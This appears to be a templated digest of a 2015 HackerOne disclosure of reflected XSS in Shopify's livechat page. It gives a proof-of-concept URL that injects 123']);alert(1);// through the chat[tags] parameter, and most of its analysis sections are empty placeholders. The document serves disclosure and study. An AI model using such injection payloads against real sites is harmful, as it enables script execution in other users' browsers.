# Reflected XSS in chat

## Metadata
- **Source:** HackerOne
- **Report:** 73566 | https://hackerone.com/reports/73566
- **Submitted:** 2015-07-01
- **Reporter:** skavans
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
https://livechat.shopify.com/customer/chats/new?chat%5Bemail%5D=mymail%40mail.com&chat%5Bname%5D=My+Name&utm_source=partner&chat%5Btags%5D=123%27%5D%29;alert%281%29;//&chat%5Bmetadata%5D%5Bshop_id%5D=90909090%22

Vulnerable param is **chat[tags]**. If fill it with **123']);alert(1);//** the XSS fill fire after click "Start chat@ button (screen).

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

https://livechat.shopify.com/customer/chats/new?chat%5Bemail%5D=mymail%40mail.com&chat%5Bname%5D=My+Name&utm_source=partner&chat%5Btags%5D=123%27%5D%29;alert%281%29;//&chat%5Bmetadata%5D%5Bshop_id%5D=90909090%22

Vulnerable param is **chat[tags]**. If fill it with **123']);alert(1);//** the XSS fill fire after click "Start chat@ button (screen).

</details>

---
*Analysed by Claude on 2026-05-24*
